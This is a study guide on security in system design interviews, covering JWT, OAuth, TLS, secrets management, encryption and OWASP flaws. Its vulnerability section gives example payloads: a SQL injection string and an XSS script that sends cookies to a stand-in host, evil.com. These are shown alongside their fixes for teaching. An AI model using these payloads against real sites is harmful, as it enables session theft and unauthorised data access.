================================================================
SECURITY IN SYSTEM DESIGN
================================================================

CORE PRINCIPLE: SECURITY BY DESIGN
-------------------------------------
Security is NOT something you bolt on at the end.
At 7+ YOE, interviewers expect you to call out security
considerations proactively during your system design.

Key areas to address in EVERY system design interview:
  1. Authentication — who are you?
  2. Authorization — what can you do?
  3. Transport security — is data encrypted in transit?
  4. Data security — is data encrypted at rest?
  5. Input validation — are you rejecting malicious input?
  6. Secrets management — where are credentials stored?

AUTHENTICATION PATTERNS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1. SESSION-BASED AUTHENTICATION (traditional):
   User logs in → server creates session, stores in DB/Redis → returns session ID cookie.
   Each request: browser sends cookie → server looks up session → validates.
   
   Pros: Easy to invalidate (delete session from store).
   Cons: Stateful (every server must access session store), scaling complexity,
         CSRF vulnerability with cookies.

2. JWT (JSON Web Token):
   Structure: base64(header).base64(payload).signature
   
   Header:  { "alg": "HS256", "typ": "JWT" }
   Payload: { "sub": "userId123", "roles": ["ADMIN"], "exp": 1712700000, "iat": 1712613600 }
   Signature: HMAC-SHA256(base64(header) + "." + base64(payload), secret)
   
   Flow:
   1. User logs in → Auth Service validates credentials.
   2. Auth Service returns signed JWT (access token + refresh token).
   3. Client stores JWT (localStorage or HttpOnly cookie).
   4. Client sends JWT in Authorization: Bearer <token> header.
   5. API Gateway/service validates signature — NO DB lookup needed (stateless).
   6. If valid and not expired → process request.
   
   Access Token: Short-lived (15 min). Used for API calls.
   Refresh Token: Long-lived (7–30 days). Used ONLY to get new access token.
                  Stored securely (HttpOnly cookie, not localStorage).
   
   CRITICAL RULES:
   - Never put sensitive data in JWT payload (it's base64 — not encrypted!)
   - Always validate: signature, expiry (exp), not-before (nbf), issuer (iss), audience (aud)
   - Use RS256 (asymmetric) for multi-service architectures: auth service signs
     with private key, other services verify with public key (no shared secret)
   
   JWT Revocation Problem:
   - JWTs are stateless → cannot be revoked before expiry
   - Mitigations: short expiry (15 min), token blocklist in Redis,
     refresh token rotation (rotate on use, revoke old), JWT ID (jti) tracking

3. OAUTH 2.0 — AUTHORIZATION FRAMEWORK:
   Delegates authorization to a third party.
   "Sign in with Google/GitHub" is OAuth 2.0.
   
   Roles:
     Resource Owner: The user (owns their data)
     Client: Your application (wants access)
     Authorization Server: Google/GitHub (issues tokens)
     Resource Server: API that holds user data (Gmail API, GitHub API)
   
   AUTHORIZATION CODE FLOW (most secure, for server-side apps):
   1. User clicks "Login with Google" → redirected to Google with:
      client_id, redirect_uri, scope, state (CSRF token), response_type=code
   2. User authenticates with Google, grants consent.
   3. Google redirects back: /callback?code=AUTH_CODE&state=...
   4. YOUR BACKEND exchanges code for tokens:
      POST /token { code, client_id, client_secret, redirect_uri }
   5. Google returns: access_token, refresh_token, id_token (OIDC)
   6. Your server stores refresh_token securely, uses access_token for API calls.
   
   PKCE (Proof Key for Code Exchange):
     For SPAs/mobile apps (no client secret). Prevents auth code interception.
     Client generates code_verifier (random), sends code_challenge (hash) upfront.
     On token exchange: sends code_verifier — server verifies the hash matches.

4. OPENID CONNECT (OIDC):
   OAuth 2.0 + identity layer.
   Adds id_token (JWT with user identity) to the OAuth 2.0 flow.
   Claims: sub (user ID), email, name, picture, given_name.
   Use OIDC when you need to know WHO the user is (not just what they can access).

AUTHORIZATION PATTERNS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

RBAC (Role-Based Access Control):
  Users have Roles. Roles have Permissions.
  User → [ADMIN, USER] → [READ, WRITE, DELETE]
  Simple to manage. Good for most applications.
  
  In JWT: "roles": ["ADMIN", "USER"]
  In service: check if user has required role for the endpoint.
  Spring Security: @PreAuthorize("hasRole('ADMIN')")

ABAC (Attribute-Based Access Control):
  Access decision based on attributes of user, resource, and environment.
  "A manager can edit documents in their own department."
  More flexible, more complex.
  Policy engine (OPA — Open Policy Agent) evaluates rules.

OPA (Open Policy Agent):
  Policy as code (Rego language). Decouples policy from service code.
  Services call OPA for authorization decisions.
  Consistent policy enforcement across all services (Java, Go, Python).

API GATEWAY AUTHORIZATION:
  Validate JWT at the gateway (not in every service).
  Pass validated user identity (userId, roles) as trusted headers to services.
  Services trust these headers (only gateway can reach them).
  Reduces auth overhead — each service doesn't re-validate JWT signature.

TRANSPORT SECURITY (TLS/HTTPS)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

TLS (Transport Layer Security):
  Encrypts data in transit. Prevents eavesdropping and tampering.
  ALL external traffic must use HTTPS (TLS 1.2 minimum, TLS 1.3 preferred).

TLS HANDSHAKE (TLS 1.3 simplified):
  1. Client Hello: supported cipher suites, client random.
  2. Server Hello: chosen cipher suite, server random, certificate.
  3. Client validates server certificate (against trusted CAs).
  4. Key exchange (ephemeral Diffie-Hellman) → shared session key.
  5. Finished: both sides confirm handshake, start encrypted communication.
  
  TLS 1.3 advantage: 1-RTT handshake (vs TLS 1.2's 2-RTT). 0-RTT resumption.

MUTUAL TLS (mTLS) — SERVICE-TO-SERVICE:
  Both sides present certificates (not just the server).
  Services verify EACH OTHER's identity.
  Common in service meshes (Istio), banking, healthcare systems.
  Ensures: only authorized services can call your service, not just any client.

CERTIFICATE MANAGEMENT:
  Let's Encrypt: free, automated public certificates (90-day, auto-renew).
  Internal CA: for internal services. AWS ACM, HashiCorp Vault CA.
  Best practice: automate renewal. Manual cert management = production outages.

HSTS (HTTP Strict Transport Security):
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  Browser refuses to connect over HTTP for 1 year after seeing this header.
  Prevents SSL stripping attacks.

SECRETS MANAGEMENT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

NEVER store secrets in:
  ✗ Source code or version control (git)
  ✗ Environment variables baked into Docker images
  ✗ Application config files committed to repos
  ✗ Log files

WHERE TO STORE SECRETS:
  HashiCorp Vault: enterprise-grade secret store with:
    Dynamic secrets (generate DB credentials on demand, auto-expire)
    Secret leasing and renewal
    Audit log of all secret accesses
    Integration with Kubernetes (Vault Agent injector)
  
  AWS Secrets Manager:
    Stores secrets (DB passwords, API keys, JWT signing keys)
    Automatic rotation for RDS credentials
    IAM-based access control
    SDK integration for Java apps
  
  Kubernetes Secrets:
    Base64-encoded secrets mounted as env vars or volumes
    NOT encrypted at rest by default — enable etcd encryption
    Better: use external-secrets-operator to sync from Vault/AWS SM
  
  Spring Boot integration:
    spring-cloud-vault: auto-loads secrets from Vault into application context
    AWS SDK: fetch from Secrets Manager in @Bean initialization

SECRET ROTATION STRATEGY:
  Rotate short-lived secrets (JWT signing keys): every 30–90 days.
  DB passwords: automate rotation via Secrets Manager (zero-downtime rotation
  requires app to retry with new credential on auth failure).

DATA SECURITY AT REST
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

ENCRYPTION AT REST:
  Database: Enable transparent data encryption (TDE).
    AWS RDS: encryption enabled at creation (AES-256, KMS-managed keys).
    Cannot enable TDE on existing unencrypted RDS instance (must snapshot + restore).
  
  S3: Server-Side Encryption (SSE-S3, SSE-KMS, SSE-C).
  EBS volumes: encrypt with KMS customer managed keys (CMK).

FIELD-LEVEL ENCRYPTION:
  Sensitive fields (SSN, credit card numbers, health data) encrypted
  at application level before writing to DB.
  Even DBA cannot see raw values.
  Use AES-256-GCM (authenticated encryption).
  
  PCI-DSS requirement: credit card PAN must never be stored unencrypted.
  Tokenization: replace PAN with random token. Actual PAN stored in
  Payment Service / Vault only. Merchants store tokens, not PANs.

PASSWORD HASHING:
  NEVER store plaintext or reversibly encrypted passwords.
  Use: bcrypt (Java: BCryptPasswordEncoder), Argon2id, scrypt.
  These are slow (adaptive cost) — make brute-forcing prohibitively expensive.
  
  // Spring Security:
  PasswordEncoder encoder = new BCryptPasswordEncoder(12);
  String hash = encoder.encode("rawPassword");
  boolean matches = encoder.matches("rawPassword", hash);

COMMON VULNERABILITIES (OWASP TOP 10)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SQL INJECTION:
  Attack: ' OR '1'='1 → bypasses WHERE clause.
  Fix: ALWAYS use parameterized queries / prepared statements.
  NEVER concatenate user input into SQL strings.
  JPA/Hibernate: use @Query with :params, never string concatenation.

XSS (Cross-Site Scripting):
  Attack: inject <script>document.location='evil.com?c='+document.cookie</script>
  Fix: escape all user input in HTML output (OWASP Java HTML Sanitizer).
  Set Content-Security-Policy (CSP) headers.
  HttpOnly cookies (JS cannot access).

CSRF (Cross-Site Request Forgery):
  Attack: malicious site sends form that triggers action on your site using victim's cookie.
  Fix: CSRF token (unique token per session, must be in request body).
  SameSite=Strict cookie attribute.
  Spring Security CSRF protection enabled by default.

IDOR (Insecure Direct Object Reference):
  Attack: change /api/orders/123 to /api/orders/124 → see another user's order.
  Fix: Always check ownership. "Does order 124 belong to the requesting user?"
  Never trust the client-provided ID without authorization check.

ZERO TRUST ARCHITECTURE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Traditional: "Trust but verify" — inside the firewall = trusted.
Zero Trust: "Never trust, always verify" — every request authenticated,
regardless of source (internal or external).

Principles:
  1. Verify explicitly: authenticate + authorize every request.
  2. Least privilege: give minimum permissions needed.
  3. Assume breach: design as if perimeter is already compromised.

Implementation:
  mTLS between all services (identity verified, not just network location)
  Short-lived credentials (rotate often)
  Service accounts with least privilege (not root/admin)
  Network segmentation (services can only reach what they need)

INTERVIEW QUESTIONS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Q: How would you secure inter-service communication?
A: mTLS at the transport layer (enforced by service mesh like Istio).
   JWT tokens in service-to-service calls carry service identity.
   Network policies (Kubernetes NetworkPolicy / security groups) restrict which
   services can even attempt to call which others.

Q: How do you handle JWT revocation?
A: JWTs are stateless — you can't revoke them before expiry.
   Solutions: short expiry (15 min) + refresh token, maintain a blocklist
   in Redis (check on each request), use JWT ID (jti) tracking.
   For critical actions (password change, logout all) → increment a version
   in DB and embed it in token; if version mismatches → reject.

Q: Where do you store API keys and DB passwords in a cloud-native app?
A: AWS Secrets Manager or HashiCorp Vault. Never in environment variables
   that are baked into images, never in git. The app fetches secrets at
   startup via SDK (with IAM role permissions), or they're injected by
   Vault Agent sidecar into env vars/files at pod startup.
